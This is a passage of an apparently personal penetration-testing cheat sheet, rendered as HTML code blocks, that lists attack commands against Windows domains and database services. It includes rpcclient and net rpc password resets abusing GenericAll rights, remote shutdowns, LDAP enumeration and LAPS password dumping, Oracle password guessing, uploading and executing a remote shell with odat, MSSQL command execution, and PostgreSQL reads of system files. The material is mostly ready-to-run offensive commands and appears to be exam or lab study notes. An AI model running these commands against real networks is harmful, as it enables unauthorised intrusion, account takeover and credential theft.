</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>chgpasswd
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>setuserinfo
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="c1"># to change pass in case of GenericAll Permission</span>
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>rpcclient&gt;<span class="w"> </span>setuserinfo2<span class="w"> </span>username<span class="w"> </span><span class="m">23</span><span class="w"> </span>newpass
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="c1"># KALI net command</span>
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="c1"># We can execute net commands remotely from kali using</span>
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="c1"># Enumerate users in a Windows/AD domain via RPC</span>
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>net<span class="w"> </span>rpc<span class="w"> </span>user<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/username%password&#39;</span><span class="w"> </span>-S<span class="w"> </span>DC_IP
</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a><span class="c1"># Reset a user&#39;s password if you have proper rights (e.g., GenericAll)</span>
</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">&quot;TargetUser&quot;</span><span class="w"> </span><span class="s2">&quot;newP@ssword2022&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;nagoya-industries.com&quot;</span>/<span class="s2">&quot;controlleduser&quot;</span>%<span class="s2">&quot;Nagoya2023&quot;</span><span class="w"> </span>-S<span class="w"> </span><span class="nv">$IP1</span><span class="w">            </span>
</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a><span class="c1"># Shut down or reboot a remote machine via RPC</span>
</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>net<span class="w"> </span>rpc<span class="w"> </span>shutdown<span class="w"> </span>-S<span class="w"> </span>TargetIP<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/admin%Pass&#39;</span><span class="w">   </span><span class="c1"># clean shutdown</span>
</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>net<span class="w"> </span>rpc<span class="w"> </span>shutdown<span class="w"> </span>-r<span class="w"> </span>-f<span class="w"> </span>-S<span class="w"> </span>TargetIP<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/admin%Pass&#39;</span><span class="w">  </span><span class="c1"># forced reboot</span>
</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a><span class="c1"># Manage remote Windows services</span>
</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>net<span class="w"> </span>rpc<span class="w"> </span>service<span class="w"> </span>stop<span class="w"> </span>ServiceName<span class="w"> </span>-S<span class="w"> </span>TargetIP<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/admin%Pass&#39;</span>
</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>net<span class="w"> </span>rpc<span class="w"> </span>service<span class="w"> </span>start<span class="w"> </span>ServiceName<span class="w"> </span>-S<span class="w"> </span>TargetIP<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/admin%Pass&#39;</span>
</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a>
</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>
</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>net<span class="w"> </span>service<span class="w"> </span>list<span class="w">                                </span><span class="c1"># List services</span>
</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a><span class="c1"># User &amp; group management</span>
</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>net<span class="w"> </span>user<span class="w"> </span>add<span class="w"> </span>&lt;username&gt;<span class="w"> </span>&lt;options&gt;<span class="w">               </span><span class="c1"># Add local user</span>
</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>net<span class="w"> </span>user<span class="w"> </span>delete<span class="w"> </span>&lt;username&gt;
</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>net<span class="w"> </span>group<span class="w"> </span>addmember<span class="w"> </span>&lt;group&gt;<span class="w"> </span>&lt;user&gt;
</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>net<span class="w"> </span>group<span class="w"> </span>removemember<span class="w"> </span>&lt;group&gt;<span class="w"> </span>&lt;user&gt;
</span></code></pre></div>
<h4 id="ldap">LDAP</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$IP1</span><span class="w"> </span>-p389<span class="w"> </span>--script<span class="o">=</span>ldap*
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="c1"># check null credentials are valid</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;IP&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;IP&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1"># without creds</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>ldapsearch<span class="w"> </span>-v<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=domain,DC=com&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;ldap://192.168.x.x&quot;</span><span class="w"> </span><span class="s2">&quot;(objectclass=*)&quot;</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="c1"># LDAP Enumeration</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>ldapdomaindump<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&lt;domain&gt;\&lt;user&gt;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;pass&gt;&#39;</span><span class="w"> </span>&lt;ip&gt;
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>cat<span class="w"> </span>domain_users.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w">  </span>-r<span class="w"> </span><span class="s1">&#39;.[].attributes.sAMAccountName[]&#39;</span><span class="w">  </span>&gt;<span class="w"> </span>domain_users.txt
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\\&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="c1"># find all users</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=user)&quot;</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="c1"># find a specific user by username</span>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(sAMAccountName=&lt;name&gt;)&quot;</span>
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="c1"># find all groups</span>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=group)&quot;</span>
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="c1"># find groups a specific user belongs to</span>
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;))&quot;</span>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="c1"># find all computer objects</span>
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=computer)&quot;</span>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>windapsearch<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-m<span class="w"> </span>users<span class="w"> </span>--dc-ip<span class="w"> </span><span class="nv">$IP1</span>
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>windapsearch<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-m<span class="w"> </span>members<span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;domain admin&#39;</span>
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>-m<span class="w"> </span>groups
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>computers
</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>privileged-users
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a><span class="c1"># LAPS Dumping</span>
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--kdcHost<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-M<span class="w"> </span>laps
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;ldap://dc-ip&quot;</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;domain\user&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;dc=domain,dc=com&quot;</span><span class="w"> </span><span class="s1">&#39;(ms-MCS-AdmPwd=*)&#39;</span><span class="w"> </span>ms-MCS-AdmPwd
</span></code></pre></div>
<h4 id="oracle-database-1521">Oracle Database (1521)</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># [odat wiki](https://github.com/quentinhardy/odat/wiki)</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>odat<span class="w"> </span>sidguesser<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.10.10.82<span class="w"> </span>-p<span class="w"> </span><span class="m">1521</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>odat<span class="w"> </span>passwordguesser<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.10.10.82<span class="w"> </span>-p<span class="w"> </span><span class="m">1521</span><span class="w"> </span>-d<span class="w"> </span>XE<span class="w"> </span>--accounts-file<span class="w"> </span>/opt/myarsenal/odat/accounts/accounts-multiple.txt
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1">#  /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>cp<span class="w"> </span>/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt<span class="w"> </span>odat/accounts/
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="c1"># vim command to repace space with forward slash</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># :%s/ /\//g</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="c1"># ODAT has a utlfile module that allows you to upload, download or delete a file</span>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>odat<span class="w"> </span>utlfile<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.10.10.82<span class="w"> </span>-p<span class="w"> </span><span class="m">1521</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;scott&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;tiger&quot;</span><span class="w"> </span>-d<span class="w"> </span>XE<span class="w"> </span>--putFile<span class="w"> </span>/temp<span class="w"> </span>rem_shell.exe<span class="w"> </span>local_shell.exe<span class="w"> </span>--sysdba
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="c1"># to execute that shell</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>odat<span class="w"> </span>externaltable<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.10.10.82<span class="w"> </span>-p<span class="w"> </span><span class="m">1521</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;scott&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;tiger&quot;</span><span class="w"> </span>-d<span class="w"> </span>XE<span class="w"> </span>--exec<span class="w"> </span>/temp<span class="w"> </span>rem_shell.exe<span class="w"> </span>local_shell.exe<span class="w"> </span>--sysdba
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>dbeaver<span class="w"> </span><span class="c1"># to connect to oracle database easily</span>
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>odat<span class="w"> </span>search<span class="w"> </span>-s<span class="w"> </span><span class="nv">$SERVER</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$SID</span><span class="w"> </span>-U<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-P<span class="w"> </span><span class="nv">$PASSWORD</span><span class="w"> </span>--sql-shell<span class="w"> </span><span class="c1"># not tested</span>
</span></code></pre></div>
<h4 id="unknown-ports">Unknown ports</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>port_number
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c1"># try pressing enter</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nb">help</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>version
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># port 3003</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span><span class="m">3003</span><span class="w"> </span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="nb">help</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>version
</span></code></pre></div>
<h4 id="sql-services">SQL Services</h4>
<ul>
<li>MSSQL 1433</li>
<li>MySQL 3306</li>
<li>PostgreSQL 5437
<div class="language-shell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># MySQL</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="w"> </span>-h<span class="w"> </span><span class="m">192</span>.168.10.10<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="k">select</span><span class="w"> </span>version<span class="o">()</span><span class="p">;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>show<span class="w"> </span>databases<span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>use<span class="w"> </span>databse<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>users<span class="p">;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>show<span class="w"> </span>tables<span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="k">select</span><span class="w"> </span>system_user<span class="o">()</span><span class="p">;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>SELECT<span class="w"> </span>user,<span class="w"> </span>authentication_string<span class="w"> </span>FROM<span class="w"> </span>mysql.user<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Pre
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>mysqldump<span class="w"> </span>--databases<span class="w"> </span>Magic<span class="w"> </span>-&lt;usser&gt;<span class="w"> </span>-&lt;pass&gt;
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c1"># MS SQL</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>nmap<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span>–script<span class="w"> </span>ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password<span class="w"> </span><span class="nv">$ip</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>impacket-mssqlclient<span class="w"> </span>Administrator:<span class="s1">&#39;pass&#39;</span>@x.x.x.x<span class="w"> </span>-windows-auth
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>SELECT<span class="w"> </span>@@version<span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>SELECT<span class="w"> </span>name<span class="w"> </span>FROM<span class="w"> </span>sys.databases<span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>SELECT<span class="w"> </span>_FROM<span class="w"> </span>offsec.information_schema.tables<span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>select_<span class="w"> </span>from<span class="w"> </span>offsec.dbo.users<span class="p">;</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>netexec<span class="w"> </span>mssql<span class="w"> </span>x.x.x.x<span class="w"> </span>--use-kcache<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami /all&#39;</span><span class="w"> </span>--port<span class="w"> </span><span class="m">14330</span>
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="c1"># PostgreSQL</span>
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>psql<span class="w"> </span>-U<span class="w"> </span>postgres<span class="w"> </span>-p<span class="w"> </span><span class="m">5437</span><span class="w"> </span>-h<span class="w"> </span>IP<span class="w">  </span>
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="k">select</span><span class="w"> </span>pg_ls_dir<span class="o">(</span><span class="s1">&#39;./&#39;</span><span class="o">)</span><span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>pg_ls_dir<span class="o">(</span><span class="s1">&#39;/etc/password&#39;</span><span class="o">)</span><span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>pg_ls_dir<span class="o">(</span><span class="s1">&#39;/home/wilson&#39;</span><span class="o">)</span><span class="p">;</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>pg_ls_dir<span class="o">(</span><span class="s1">&#39;/home/Wilson/local.txt&#39;</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></div></li>
</ul>
<h5 id="sql-commands">Sql Commands</h5>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">-- MySQL </span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="k">select</span><span class="w"> </span><span class="k">system_user</span><span class="p">();</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">use</span><span class="w"> </span><span class="n">databasename</span><span class="p">;</span>
